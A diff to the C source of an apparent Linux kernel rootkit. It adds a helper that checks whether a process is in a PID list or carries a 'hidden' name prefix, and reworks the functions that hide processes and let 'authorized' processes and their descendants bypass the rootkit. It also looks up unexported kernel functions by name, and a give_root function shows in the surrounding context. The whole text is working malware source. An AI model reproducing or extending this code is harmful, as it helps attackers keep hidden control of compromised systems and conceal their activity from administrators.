@@ -193,29 +193,114 @@ long give_root(const pid_t i32_pid, const int i32_sig)
     return 0;
 }
 
+static bool is_pid_in_list(pid_t *const p_pid, task_t **const pp_task,
+                           const struct list_head *const p_pid_list)
+{
+    bool b_ret                    = false; // Return value
+    const pid_list_t *p_pid_entry = NULL;  // PID list entry
+    task_t *p_task                = NULL;  // Task structure, either from args or from PID
+    pid_t i32_pid                 = -1;    // PID to check, either from args or from task
+
+    if (p_pid != NULL) {
+        i32_pid = *p_pid;
+    }
+    if (pp_task != NULL) {
+        p_task = *pp_task;
+    }
+
+    IF_U (i32_pid == -1 && p_task == NULL) {
+        pr_warn("[ROOTKIT]   * is_pid_in_list: No PID or task given\n");
+        return false;
+    }
+
+    if (i32_pid == -1) {
+        i32_pid = p_task->pid;
+
+        if (p_pid != NULL) {
+            *p_pid = i32_pid;
+        }
+    }
+    else if (p_task == NULL) {
+        if (i32_pid == 0 || i32_pid == current->pid) {
+            p_task = get_task_struct(current);
+        }
+        else {
+            IF_U (_find_get_task_by_vpid == NULL) {
+                _find_get_task_by_vpid = (task_t * (*)(pid_t)) lookup_name("find_get_task_by_vpid");
+
+                pr_info("[ROOTKIT]   * `find_get_task_by_vpid()` address: %p\n",
+                        _find_get_task_by_vpid);
+
+                IF_U (_find_get_task_by_vpid == NULL) {
+                    pr_err("[ROOTKIT]   * Failed to get `find_get_task_by_vpid()` address\n");
+                    return false;
+                }
+            }
+
+            p_task = _find_get_task_by_vpid(i32_pid);
+        }
+
+        IF_U (p_task == NULL) {
+            pr_err("[ROOTKIT]   * Failed to get task struct\n");
+            return false;
+        }
+
+        if (pp_task != NULL) {
+            *pp_task = p_task;
+        }
+    }
+
+    BUG_ON(p_task->pid != i32_pid);
+    //pr_info("[ROOTKIT]   * Checking PID %d, task PID %d\n", i32_pid, p_task->pid);
+
+    pr_info("[ROOTKIT]   * Task comm: %s", p_task->comm);
+    IF_U (is_filename_hidden(p_task->comm)) {
+        pr_cont(" -> has hidden prefix\n");
+        b_ret = true;
+        goto put_return;
+    }
+    else {
+        pr_cont(" -> no hidden prefix\n");
+    }
+
+    // Check if the given PID is in the list
+    list_for_each_entry (p_pid_entry, p_pid_list, list) {
+        pr_info("[ROOTKIT]   * Checking PID %d against given PID %d...", p_pid_entry->i32_pid,
+                i32_pid);
+
+        IF_U (p_pid_entry->i32_pid == i32_pid) {
+            pr_cont(" yes!\n");
+            b_ret = true;
+            goto put_return;
+        }
+        else {
+            pr_cont(" no\n");
+        }
+    }
+
+put_return:
+    if (pp_task == NULL) {
+        // Put the task struct as it won't be used anymore
+        put_task_struct(p_task);
+    }
+    return b_ret;
+}
+
 bool is_pid_hidden(const pid_t i32_pid)
 {
-    const pid_list_t *p_hidden_pid = NULL;                       // Hidden PID list entry
-    const pid_t i32_real_pid       = get_effective_pid(i32_pid); // Effective PID to check
+    // TODO: Also check children PIDs
+    pid_t i32_real_pid = get_effective_pid(i32_pid); // Effective PID to check
 
     if (i32_real_pid == -1) {
         return false;
     }
 
-    // Check if the given PID is in the hidden list
-    list_for_each_entry (p_hidden_pid, &hidden_pids_list, list) {
-        pr_info("[ROOTKIT]   * Checking hidden PID %d against given PID %d...",
-                p_hidden_pid->i32_pid, i32_real_pid);
-        if (p_hidden_pid->i32_pid == i32_real_pid) {
-            pr_cont(" found!\n");
-            return true;
-        }
-        else {
-            pr_cont(" not found\n");
-        }
-    }
+    pr_info("[ROOTKIT] * Checking if PID %d is hidden...\n", i32_real_pid);
 
-    return false;
+    // TODO: Check if one of the parent PIDs is hidden
+    //       Factorize common code with `is_process_authorized()`
+
+    return is_pid_in_list(&i32_real_pid, NULL, &hidden_pids_list);
 }
 
 long show_hide_process(const pid_t i32_pid, const int i32_sig)
@@ -281,72 +366,52 @@ void show_all_processes(void)
 
 bool is_process_authorized(const pid_t i32_pid)
 {
-    bool b_ret                         = false;                      // Return value
-    const pid_list_t *p_authorized_pid = NULL;                       // Authorized PID list entry
-    const pid_t i32_real_pid           = get_effective_pid(i32_pid); // Effective PID to check
-    task_t *p_task                     = NULL;                       // Task structure
-    task_t *p_task_tmp                 = NULL;                       // Temp pointer for iteration
-    task_t *p_task_tmp2                = NULL;                       // Temp pointer for iteration
+    bool b_ret            = false;                      // Return value
+    pid_t i32_real_pid    = get_effective_pid(i32_pid); // Effective PID to check
+    task_t *p_task        = NULL;                       // Task with the given PID
+    task_t *p_task_parent = NULL;                       // Parent task
+    task_t *p_task_tmp    = NULL;                       // Temp pointer to keep a reference
 
     if (i32_real_pid == -1) {
         return false;
     }
 
-    IF_U (_find_get_task_by_vpid == NULL) {
-        _find_get_task_by_vpid = (task_t * (*)(pid_t)) lookup_name("find_get_task_by_vpid");
+    pr_info("[ROOTKIT] * Checking if PID %d is authorized...\n", i32_real_pid);
 
-        pr_info("[ROOTKIT] * `find_get_task_by_vpid()` address: %p\n", _find_get_task_by_vpid);
+    // Check if the given PID is authorized, and get its task struct
+    b_ret = is_pid_in_list(&i32_real_pid, &p_task, &authorized_pids_list);
 
-        IF_U (_find_get_task_by_vpid == NULL) {
-            pr_err("[ROOTKIT] * Failed to get `find_get_task_by_vpid()` address\n");
-            return false;
+    IF_U (b_ret) {
+        pr_info("[ROOTKIT]   * PID %d can bypass rootkit!\n", i32_real_pid);
+        goto loop_end;
+    }
+
+    pr_info("[ROOTKIT]   * AUTH Task comm: %s\n", p_task->comm);
+
+    // Check if one of the given process' parents is in the authorized list
+    p_task_parent = p_task;
+    while (true) {
+        p_task_parent = get_task_struct(p_task_parent);
+
+        rcu_read_lock();
+        p_task_tmp = rcu_dereference(p_task_parent->real_parent);
+        rcu_read_unlock();
+        put_task_struct(p_task_parent);
+        p_task_parent = p_task_tmp;
+
+        if (p_task_parent == NULL || p_task_parent->pid == 0) {
+            b_ret = false;
+            break;
         }
-    }
 
-    if (i32_pid == 0 || i32_real_pid == current->pid) {
-        p_task = get_task_struct(current);
-    }
-    else {
-        p_task = _find_get_task_by_vpid(i32_real_pid);
-    }
+        pr_info("[ROOTKIT]   * Checking parent PID %d...", p_task_parent->pid);
 
-    pr_info("[ROOTKIT] * Checking if PID %d is authorized (task PID: %d)...\n", i32_real_pid,
-            p_task->pid);
+        b_ret = is_pid_in_list(NULL, &p_task_parent, &authorized_pids_list);
 
-    // Check if the given PID is in the authorized list
-    list_for_each_entry (p_authorized_pid, &authorized_pids_list, list) {
-        pr_info("[ROOTKIT]   * Checking authorized PID %d against given PID %d...",
-                p_authorized_pid->i32_pid, i32_real_pid);
-
-        if (p_authorized_pid->i32_pid == i32_real_pid) {
-            pr_info("[ROOTKIT]   * PID %d can bypass rootkit\n", i32_real_pid);
-            b_ret = true;
+        IF_U (b_ret) {
+            pr_info("[ROOTKIT]   * PID %d can bypass rootkit (thanks to parent %d)!\n",
+                    i32_real_pid, p_task_parent->pid);
             goto loop_end;
-        }
-        else {
-            p_task_tmp = p_task;
-
-            while (p_task_tmp != NULL && p_task_tmp->pid != 0) {
-                p_task_tmp = get_task_struct(p_task_tmp);
-
-                pr_info("[ROOTKIT]   * Checking parent PID %d against given PID %d...",
-                        p_task_tmp->pid, p_authorized_pid->i32_pid);
-
-                if (p_authorized_pid->i32_pid == p_task_tmp->pid) {
-                    pr_info("[ROOTKIT]   * PID %d can bypass rootkit (thanks to parent %d)\n",
-                            i32_real_pid, p_task_tmp->pid);
-                    put_task_struct(p_task_tmp);
-                    b_ret = true;
-                    goto loop_end;
-                }
-                rcu_read_lock();
-                p_task_tmp2 = rcu_dereference(p_task_tmp->real_parent);
-                rcu_read_unlock();
-                put_task_struct(p_task_tmp);
-                p_task_tmp = p_task_tmp2;
-
-                pr_info("[ROOTKIT]   * Parent task: %p\n", p_task_tmp);
-            }
         }
     }
 
